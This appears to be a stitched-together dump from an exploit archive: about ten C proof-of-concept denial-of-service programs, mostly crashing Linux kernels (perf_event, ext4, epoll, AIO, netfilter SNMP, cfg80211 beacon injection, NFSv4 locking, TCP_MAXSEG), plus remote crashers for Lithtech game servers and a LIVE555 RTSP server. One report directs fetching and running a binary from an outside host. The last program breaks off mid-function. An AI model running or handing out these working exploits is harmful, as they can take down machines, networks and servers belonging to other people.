/* This test will crash Linux 3.0.0                                          */
/* compile with gcc -O2 -o oflo_sw_cpu_clock_crash oflo_sw_cpu_clock_crash.c */
/* by Vince Weaver <vweaver1 _at_ eecs.utk.edu>                              */
#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>

#include <sys/prctl.h>
#define MATRIX_SIZE 512
static double a[MATRIX_SIZE][MATRIX_SIZE];
static double b[MATRIX_SIZE][MATRIX_SIZE];
static double c[MATRIX_SIZE][MATRIX_SIZE];
static void naive_matrix_multiply(int quiet) {
  double s;
  int i,j,k;
  for(i=0;i<MATRIX_SIZE;i++) {
    for(j=0;j<MATRIX_SIZE;j++) {
      a[i][j]=(double)i*(double)j;
      b[i][j]=(double)i/(double)(j+5);
    }
  }
  for(j=0;j<MATRIX_SIZE;j++) {
     for(i=0;i<MATRIX_SIZE;i++) {
        s=0;
        for(k=0;k<MATRIX_SIZE;k++) {
	   s+=a[i][k]*b[k][j];
	}
        c[i][j] = s;
     }
  }
  s=0.0;
  for(i=0;i<MATRIX_SIZE;i++) {
    for(j=0;j<MATRIX_SIZE;j++) {
      s+=c[i][j];
    }
  }
  if (!quiet) printf("Matrix multiply sum: s=%lf\n",s);
  return;
}

static int total=0;
void our_handler(int signum,siginfo_t *oh, void *blah) {
  int fd=oh->si_fd;
  ioctl(fd , PERF_EVENT_IOC_DISABLE,0);
  total++;
  ioctl(fd , PERF_EVENT_IOC_REFRESH,1);
}
int perf_event_open(struct perf_event_attr *hw_event_uptr,
		    pid_t pid, int cpu, int group_fd, unsigned long flags) {
  return syscall(__NR_perf_event_open,hw_event_uptr,pid,cpu,group_fd,flags);
}
int main( int argc, char **argv ) {
	int fd;
	void *blargh;
	struct perf_event_attr pe;
	struct sigaction sa;
	memset(&sa, 0, sizeof(struct sigaction));
	sa.sa_sigaction=our_handler;
	sa.sa_flags=SA_SIGINFO;
	if (sigaction(SIGIO,&sa,NULL)<0) {
	  fprintf(stderr,"Error setting up signal handler\n");
	  exit(1);
	}
        memset(&pe,0,sizeof(struct perf_event_attr));	
	pe.type=PERF_TYPE_SOFTWARE;
	pe.size=sizeof(struct perf_event_attr);
        pe.config=PERF_COUNT_SW_CPU_CLOCK;
	pe.sample_period=100000;
	pe.sample_type=PERF_SAMPLE_IP;
	pe.read_format=PERF_FORMAT_GROUP|PERF_FORMAT_ID;
	pe.disabled=1;
	pe.pinned=1;
	pe.exclude_kernel=1;
	pe.exclude_hv=1;
	pe.wakeup_events=1;
	fd=perf_event_open(&pe,0,-1,-1,0);
	if (fd<0) {
	   printf("Error opening\n");
	}
	blargh=mmap(NULL,(1+2)*4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
	fcntl(fd,F_SETFL,O_RDWR|O_NONBLOCK|O_ASYNC);
	fcntl(fd,F_SETSIG,SIGIO);
	fcntl(fd,F_SETOWN,getpid());
	ioctl(fd,PERF_EVENT_IOC_RESET,0);
	ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
	naive_matrix_multiply(0);
	ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
	munmap(blargh,(1+2)*4096);
	close(fd);
	printf("Total overflows: %d\n",total);
	return 0;
}

source: http://www.securityfocus.com/bid/60586/info

The Linux Kernel is prone to a local denial-of-service vulnerability.

Local attackers can exploit this issue to trigger an infinite loop which may cause denial-of-service conditions. 

/*
** PoC - kernel <= 3.10 CPU Thread consumption in ext4 support. (Infinite loop)
** Jonathan Salwan - 2013-06-05
*/

#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>

struct ext4_new_group_input {
        __u32 group;
        __u64 block_bitmap;
        __u64 inode_bitmap;
        __u64 inode_table;
        __u32 blocks_count;
        __u16 reserved_blocks;
        __u16 unused;
};

#define EXT4_IOC_GROUP_ADD  _IOW('f', 8, struct ext4_new_group_input)

int main(int ac, const char *av[]){
  struct ext4_new_group_input input;
  int fd;

  if (ac < 2){
    printf("Syntax  : %s <ext4 device>\n", av[0]);
    printf("Example : %s /tmp\n", av[0]);
    return -1;
  }

  printf("[+] Opening the ext4 device\n");
  if ((fd = open(av[1], O_RDONLY)) < 0){
    perror("[-] open");
    return -1;
  }

  printf("[+] Trigger the infinite loop\n");
  input.group = -1;
  if (ioctl(fd, EXT4_IOC_GROUP_ADD, &input) < 0){
    perror("[-] ioctl");
  }

  close(fd);
  return 0;
}


/*
The Linux Kernel is prone to a local denial-of-service vulnerability. 

Successful exploits will allow attackers to cause the kernel to crash, denying service to legitimate users.
*/


#include <netinet/in.h>
#include <sys/epoll.h>
#include <errno.h>

int
main ()
{
    struct sockaddr_in addr;
    struct epoll_event event;
    int epfd1, epfd2, sock;
    int rc;
    int i = 0;
    while (1)
    {
        printf("ITERATION %d\n", ++i);
        epfd1 = epoll_create(1);
        printf("epoll_create() -> %d(%d)\n", epfd1, errno);
        epfd2 = epoll_create(1);
        printf("epoll_create() -> %d(%d)\n", epfd2, errno);

        sock = socket(PF_INET, SOCK_STREAM, 0);
        printf("socket() -> %d(%d)\n", sock, errno);

        addr.sin_family = AF_INET;
        addr.sin_port = 0;
        addr.sin_addr.s_addr = 0;
        rc = bind(sock, (struct sockaddr*)&addr, sizeof(addr));
        printf("bind() -> %d(%d)\n", rc, errno);

        rc = listen(sock, 1);
        printf("listen() -> %d(%d)\n", rc, errno);

        event.data.fd = sock;
        event.events = 0;
        rc = epoll_ctl(epfd1, EPOLL_CTL_ADD, sock, &event);
        printf("epoll_ctl() -> %d(%d)\n", rc, errno);

        event.data.fd = epfd2;
        event.events = EPOLLIN;
        rc = epoll_ctl(epfd1, EPOLL_CTL_ADD, epfd2, &event);
        printf("epoll_ctl() -> %d(%d)\n", rc, errno);

        event.data.fd = epfd1;
        event.events = EPOLLIN;
        rc = epoll_ctl(epfd2, EPOLL_CTL_ADD, epfd1, &event);
        printf("epoll_ctl() -> %d(%d)\n", rc, errno);

        rc = close(epfd1);
        printf("close(epfd1) -> %d(%d)\n", rc, errno);

        rc = close(epfd2);
        printf("close(epfd2) -> %d(%d)\n", rc, errno);

        rc = close(sock);
        printf("close(sock) -> %d(%d)\n", rc, errno);

        sleep(1);
        printf("\n\n");
    }
    return 0;
}//
// Proof of Concept by Daniel McNeil
// compile using cc -o aiodio_read aiodio_read.c -laio
//

#define _XOPEN_SOURCE 600 
#define _GNU_SOURCE 


#include <unistd.h> 
#include <stdlib.h> 
#include <stdio.h> 
#include <string.h> 
#include <errno.h> 
#include <sys/fcntl.h> 
#include <sys/mman.h> 
#include <sys/wait.h> 
#include <sys/stat.h> 


#include <libaio.h> 


int pagesize; 
char *iobuf; 
io_context_t myctx; 
int aio_maxio = 4; 


/* 
* do a AIO DIO write 
*/ 
int do_aio_direct_read(int fd, char *iobuf, int offset, int size) 
{ 
struct iocb myiocb; 
struct iocb *iocbp = &myiocb; 
int ret; 
struct io_event e; 
struct stat s; 


io_prep_pread(&myiocb, fd, iobuf, size, offset); 
if ((ret = io_submit(myctx, 1, &iocbp)) != 1) { 
perror("io_submit"); 
return ret; 
} 


ret = io_getevents(myctx, 1, 1, &e, 0); 


if (ret) { 
struct iocb *iocb = e.obj; 
int iosize = iocb->u.c.nbytes; 
char *buf = iocb->u.c.buf; 
long long loffset = iocb->u.c.offset; 


printf("AIO read of %d at offset %lld returned %d\n", 
iosize, loffset, e.res); 
} 


return ret; 



} 


int main(int argc, char *argv[]) 
{ 
char *filename; 
int fd; 
int err; 

filename = "test.aio.file"; 
fd = open(filename, O_RDWR|O_DIRECT|O_CREAT|O_TRUN­C, 0666); 


pagesize = getpagesize(); 
err = posix_memalign((void**) &iobuf, pagesize, pagesize); 
if (err) { 
fprintf(stderr, "Error allocating %d aligned bytes.\n", 
pagesize); 
exit(1); 
} 
err = write(fd, iobuf, pagesize); 
if (err != pagesize) { 
fprintf(stderr, "Error ret = %d writing %d bytes.\n", 
err, pagesize); 
perror(""); 
exit(1); 
} 
memset(&myctx, 0, sizeof(myctx)); 
io_queue_init(aio_maxio, &myctx); 
err = do_aio_direct_read(fd, iobuf, 0, pagesize); 
close(fd); 


printf("This will panic on ppc64\n"); 
return err; 

}

// milw0rm.com [2005-04-04]
/*
 *  ecl-nf-snmpwn.c - 30/05/06
 *
 *  Alex Behar <alex@ecl-labs.org>
 *  Yuri Gushin <yuri@ecl-labs.org>
 *  
 *  A patch review we did on the 2.6.16.17->18 Linux kernel source tree revealed
 * a restructuring of code in the snmp_parse_mangle() and the snmp_trap_decode()
 * functions. After further research it turned out to be a vulnerability
 * previously reported[1] and assigned with CVE-2006-2444. For more details,
 * the version change log.
 *
 *
 *
 * 1) http://kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.18
 *
 * -- 
 * Greets fly out to the ECL crew - Valentin Slavov, Dimityr Manevski. 
 * To stranger, shrink, the Console Pimps crew (blexim, ex0, hugin, w00f, matt,
 * kyu, kbd and the rest), our favorite soldier boy Sagi Horev, the SigMIL crew,
 * izik, tanin00, and everyone else we left out. 
 *
 * P.S. - blexim, how are your FACECRABS ???? :))))
 *
 */


#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <libnet.h>

void banner();
void usage(char *);

char pwnage[] = "\x30\x0a\x02\x01\x00\x04\x03\x45\x43\x4c\xa4\x00";

int main(int argc, char **argv)
{
	char errbuf[LIBNET_ERRBUF_SIZE];
	libnet_t *l;
	int c;
	u_char *buf;
	int packet_len = 0;
	struct ip *IP;
	struct udphdr *UDP;
	u_int32_t src = 0, dst = 0;


	banner();

	if (argc < 3) usage(argv[0]);

	if ((l = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL) {
		fprintf(stderr, "[!] libnet_init() failed: %s", errbuf);
		exit(-1);
	}

	if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
		fprintf(stderr, "[!] Unresolved source address.\n");
		exit(-1);
	}
	if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
		fprintf(stderr, "[!] Unresolved destination address.\n");
		exit(-1);
	}

	if ((buf = malloc(IP_MAXPACKET)) == NULL) {
		perror("malloc");
		exit(-1);
	}

	UDP = (struct udphdr *)(buf + LIBNET_IPV4_H);

	packet_len = LIBNET_IPV4_H + LIBNET_UDP_H + sizeof(pwnage) - 1;

	srand(time(NULL));
	IP = (struct ip *) buf;
	IP->ip_v    = 4;                   /* version 4 */
	IP->ip_hl   = 5;		     /* header length */
	IP->ip_tos  = 0;                   /* IP tos */
	IP->ip_len  = htons(packet_len);   /* total length */
	IP->ip_id   = rand();              /* IP ID */
	IP->ip_off  = htons(0);            /* fragmentation flags */
	IP->ip_ttl  = 64;                  /* time to live */
	IP->ip_p    = IPPROTO_UDP;         /* transport protocol */
	IP->ip_sum  = 0;
	IP->ip_src.s_addr = src;
	IP->ip_dst.s_addr = dst;

	UDP->uh_sport = rand();
	UDP->uh_dport = (argc > 3) ? htons((u_short)atoi(argv[3])) : htons(161);
	UDP->uh_ulen = htons(LIBNET_UDP_H + sizeof(pwnage) - 1);
	UDP->uh_sum = 0;

	memcpy(buf + LIBNET_IPV4_H + LIBNET_UDP_H, pwnage, sizeof(pwnage) - 1);

	libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_UDP, packet_len - LIBNET_IPV4_H);

	if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
	{
		fprintf(stderr, "[!] Write error: %s\n", libnet_geterror(l));
		exit(-1);
	}

	printf("[+] Packet sent.\n");

	libnet_destroy(l);
	free(buf);
	return (0);
}

void usage(char *cmd)
{
	printf("[!] Usage: %s <source> <destination> [port]\n", cmd);
	exit(-1);
}

void banner()
{
	printf("\t\tNetfilter NAT SNMP module DoS exploit\n"
			"\t\t   Yuri Gushin <yuri@ecl-labs.org>\n"
			"\t\t    Alex Behar <alex@ecl-labs.org>\n"
			"\t\t\t       ECL Team\n\n\n");
}

// milw0rm.com [2006-06-05]
/*
 * cfg80211-remote-dos.c
 *
 * Linux Kernel < 2.6.30.5 cfg80211 Remote DoS
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 * 
 * Information:
 *
 *   http://patchwork.kernel.org/patch/41218/
 *
 *   These pointers can be NULL, the is_mesh() case isn't ever hit in the 
 *   current kernel, but cmp_ies() can be hit under certain conditions.
 *
 * Usage:
 *
 *   $ gcc cfg80211-remote-dos.c -o cfg80211-remote-dos -lorcon
 *   $ airmon-ng start wlan0
 *   ...
 *   $ ./cfg80211-remote-dos mon0 mac80211
 *   [+] Initializing interface mon0...
 *   [+] Injecting crafted DoS beacon frames...
 *
 * Notes:
 *
 *   The NULL pointer dereference is triggered if the victim scans and receives
 *   a beacon frame that does not contain a SSID IE and then receives another 
 *   one that does have a SSID IE.  Raw frame injection via LORCON is required 
 *   on the wireless interface.  This should only affect the 2.6.30 series.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

#include <tx80211.h>
#include <tx80211_packet.h>

#define BEACON_NOSSID \
	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff" \
	"\x00\x03\x52\x00\x00\x00" \
	"\x00\x03\x52\x00\x00\x00" \
	"\x30\x4b" \
	"\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04" \
	"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24" \
	"\x03\x01\x07" \
	"\x05\x04\x00\x01\x01\x00" \
	"\x2a\x01\x04" \
	"\x32\x04\x30\x48\x60\x6c"
#define BEACON_NOSSID_LEN 64

#define BEACON_SSID \
	"\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff" \
	"\x00\x03\x52\x00\x00\x00" \
	"\x00\x03\x52\x00\x00\x00" \
	"\x30\x4b" \
	"\x5f\x74\x34\x77\xdb\x03\x00\x00\x64\x00\x21\x04" \
	"\x00\x03\x44\x6f\x53" \
	"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24" \
	"\x03\x01\x07" \
	"\x05\x04\x00\x01\x01\x00" \
	"\x2a\x01\x04" \
	"\x32\x04\x30\x48\x60\x6c"
#define BEACON_SSID_LEN 69

void
usage(char **argv)
{
	int i;
	struct tx80211_cardlist *cardlist;

	printf("Usage: %s [interface] [drivername]\n", argv[0]);

	cardlist = tx80211_getcardlist();

	if (cardlist == NULL) {
		printf("Error accessing supported cardlist.\n");
	} else {
		printf("\nSupported drivers are: ");
		for (i = 1; i < cardlist->num_cards; i++) {
			printf("%s ", cardlist->cardnames[i]);
		}
		printf("\n");
	}
	tx80211_freecardlist(cardlist);
}

int
main(int argc, char **argv)
{
	struct tx80211 tx;
	struct tx80211_packet pkt;
	char p1[BEACON_NOSSID_LEN];
	char p2[BEACON_SSID_LEN];
	int ret, drivertype;
	uint8_t randbyte;

	if (argc < 3) {
		usage(argv);
		return 0;
	}

	printf("[+] Initializing interface %s...\n", argv[1]);

	drivertype = tx80211_resolvecard(argv[2]);
	if (drivertype == INJ_NODRIVER) {
		printf("[-] Driver name not recognized.\n");
		exit(1);
	}

	ret = tx80211_init(&tx, argv[1], drivertype);
	if (ret < 0) {
		printf("[-] Error initializing %s/%s", argv[1], argv[2]);
		exit(1);
	}

	ret = tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON);
	if (ret != 0) {
		printf("[-] Error setting monitor mode.\n");
		printf("[-] %s.\n", tx80211_geterrstr(&tx));
		exit(1);
	}

	ret = tx80211_setchannel(&tx, 11);
	if (ret < 0) {
		printf("[-] Error setting channel.\n");
		printf("[-] %s.\n", tx80211_geterrstr(&tx));
		exit(1);
	}

	ret = tx80211_open(&tx);
	if (ret < 0) {
		printf("[-] Unable to open interface %s\n", tx.ifname);
		printf("[-] %s.\n", tx80211_geterrstr(&tx));
		exit(1);
	}

	srand(time(NULL));

	memcpy(p1, BEACON_NOSSID, BEACON_NOSSID_LEN);
	memcpy(p2, BEACON_SSID, BEACON_SSID_LEN);
	
	printf("[+] Injecting crafted DoS beacon frames...\n");

	while (1) {
		randbyte = rand() & 0xff;
		p1[15] = randbyte;
		p1[21] = randbyte;
		p2[15] = randbyte;
		p2[21] = randbyte;

		pkt.packet = p1;
		pkt.plen = BEACON_NOSSID_LEN;
		if (tx80211_txpacket(&tx, &pkt) < 0) {
			printf("[-] Unable to transmit packet.\n");
			printf("[-] %s.\n", tx80211_geterrstr(&tx));
			exit(1);
		}

		pkt.packet = p2;
		pkt.plen = BEACON_SSID_LEN;
		if (tx80211_txpacket(&tx, &pkt) < 0) {
			printf("[-] Unable to transmit packet.\n");
			printf("[-] %s.\n", tx80211_geterrstr(&tx));
			exit(1);
		}
	}

	tx80211_close(&tx);

	return 0;
}

// milw0rm.com [2009-08-18]
/*
Description of problem:

execution of a particular program from the Arachne suite reliably causes a
kernel panic due to a NULL-pointer dereference in nfs4_proc_lock().

Version-Release number of selected component (if applicable):

2.6.18-164.2.1.el5

How reproducible:

always on NFSv4 mounted directories

Steps to Reproduce:
1. wget http://www.genoscope.cns.fr/externe/redhat/XMLMissingField
2. Save a copy on an NFSv4-mounted directory
3. Execute it

Actual results:

Kernel panic

Expected results:

No panic

Additional info:

Console output:

Unable to handle kernel NULL pointer dereference at 0000000000000030 RIP:
 [<ffffffff8837b210>] :nfs:nfs4_proc_lock+0x21f/0x3ad
PGD 1026eec067 PUD 1026f2f067 PMD 0
Oops: 0000 [1] SMP
last sysfs file: /block/dm-1/range
CPU 0
Modules linked in: ipmi_devintf ipmi_si ipmi_msghandler nfs lockd fscache
nfs_acl sunrpc bonding ipv6 xfrm_nalgo crypto_api video hwmon backlight sbs
i2c_ec button battery asus_acpi acpi_memhotplug ac joydev sg shpchp i2c_nforce2
i2c_core forcedeth dm_snapshot dm_zero dm_mod sata_nv libata mptsas mptscsih
mptbase scsi_transport_sas sd_mod scsi_mod ext3 jbd uhci_hcd ohci_hcd ehci_hcd
Pid: 4070, comm: XMLMissingField Not tainted 2.6.18-164.2.1.el5 #1
RIP: 0010:[<ffffffff8837b210>]  [<ffffffff8837b210>]
:nfs:nfs4_proc_lock+0x21f/0x3ad
RSP: 0018:ffff810819bdbdd8  EFLAGS: 00010246
RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
RDX: ffff810827c52088 RSI: 0000000000000006 RDI: ffff810819bdbe38
RBP: ffff81081a6dfdc0 R08: 0000000000000001 R09: ffff810819bdbd68
R10: ffff810819bdbd68 R11: 00000000000000d0 R12: ffff810827c52088
R13: 0000000000000000 R14: ffff810819a9b930 R15: 0000000000000006
FS:  00002b97d31fc7b0(0000) GS:ffffffff803c1000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
CR2: 0000000000000030 CR3: 00000010268cb000 CR4: 00000000000006e0
Process XMLMissingField (pid: 4070, threadinfo ffff810819bda000, task
ffff810827d6a7e0)
Stack:  00000000000003e8 0000000000000000 ffff810819a9b930 ffffffff88373e4f
 0000000000000000 0000000000000000 0000000000000000 0000000019a9ba40
 ffff810819bdbe18 ffff810819bdbe18 0000000000000000 0000000000000000
Call Trace:
 [<ffffffff88373e4f>] :nfs:nfs_sync_inode_wait+0x116/0x1db
 [<ffffffff8836a226>] :nfs:do_setlk+0x55/0x8c
 [<ffffffff80039e72>] fcntl_setlk+0x11e/0x273
 [<ffffffff800b66fa>] audit_syscall_entry+0x180/0x1b3
 [<ffffffff8002e5bb>] sys_fcntl+0x269/0x2dc
 [<ffffffff8005d28d>] tracesys+0xd5/0xe0


Code: 49 8b 45 30 4c 89 e6 4c 89 ef 45 8a 74 24 58 48 8b 40 18 48
RIP  [<ffffffff8837b210>] :nfs:nfs4_proc_lock+0x21f/0x3ad
 RSP <ffff810819bdbdd8>
CR2: 0000000000000030
 <0>Kernel panic - not syncing: Fatal exception

PoC:
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

int main(int argc, char **argv)
{
	int fd, err;
	struct flock fl = { .l_type	= F_RDLCK,
			    .l_whence	= SEEK_SET };

	fd = open("/proc/self/exe", O_RDONLY);
	if (fd < 0) {
		fprintf(stderr, "Couldn't open /proc/self/exe: %s\n",
			strerror(errno));
		return 1;
	}

	err = fcntl(fd, F_SETLK, &fl);
	if (err != 0) {
		fprintf(stderr, "setlk errno: %d\n", errno);
		return 1;
	}

	return 0;
}
/*
 * TCP_MAXSEG Kernel Panic DoS for Linux < 2.6.37-rc2
 * by zx2c4
 *
 * This exploit triggers CVE-2010-4165, a divide by zero
 * error in net/ipv4/tcp.c. Because this is on the softirq
 * path, the kernel oopses and then completely dies with
 * no chance of recovery. It has been very reliable as a
 * DoS, but is not useful for triggering other bugs.
 *
 * -zx2c4, 28-2-2011
 */

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

int main()
{
	struct sockaddr_in laddr;
	memset(&laddr, 0, sizeof(laddr));
	laddr.sin_family = AF_INET;
	laddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	laddr.sin_port = htons(31337);
	int listener = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listener < 0) {
		printf("[-] Could not open listener.\n");
		return -1;
	}
	int val = 12;
	if (setsockopt(listener, IPPROTO_TCP, TCP_MAXSEG, &val, sizeof(val)) < 0) {
		printf("[-] Could not set sockopt.\n");
		return -1;
	}
	if (bind(listener, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) {
		printf("[-] Could not bind to address.\n");
		return -1;
	}
	if (listen(listener, 1) < 0) {
		printf("[-] Could not listen.\n");
		return -1;
	}
	int hello = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hello < 0) {
		printf("[-] Could not open connector.\n");
		return -1;
	}
	if (connect(hello, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) {
		printf("[-] Could not connect to listener.\n");
		return -1;
	}
	printf("[-] Connection did not trigger oops.\n");
	return 0;
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

/* Moved to one file milw0rm.com - lithsock.zip */

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    27888
#define TIMEOUT 3
#define CHECK   "\x10\x7f\x33\x01"
#define ZERO    ""  // 0 bytes, a cool bug

#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                  < 0) std_err();



int info_proto(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs("\n"
        "Lithtech engine (new protocol) socket unreacheable "VER"\n"
        "  Contract Jack           <= 1.1\n"
        "  No one lives forever 2  <= 1.3\n"
        "  Tron 2.0                <= 1.042\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- check if server is online\n", stdout);
    SEND(CHECK);
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, no reply received\n\n", stdout);
        exit(1);
    } else {
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len < 0) std_err();
        if(memcmp(buff, CHECK, 3)) {
            if(*buff == '\\') {
                fputs("- received an information reply, seems you have specified a wrong port.\n"
                    "  Try with a lower one\n", stdout);
            } else {
                fputs("\nError: unknown data received, this is none of the vulnerable games\n\n", stdout);
            }
            exit(1);
        }
    }

    fputs("- send a ZERO bytes packet\n", stdout);
    SEND(ZERO);

    fputs("- wait one second\n", stdout);
    sleep(ONESEC);

    fputs("- check if the server is vulnerable:\n", stdout);
    SEND(CHECK);

    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}

#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-12-13]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        554
#define BOOM        "x x\r\n\r\n"



int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u16     port    = PORT;
    u8      buff[8];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "LIVE555 Media Server <= 2007.11.01 parseRTSPRequestString DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
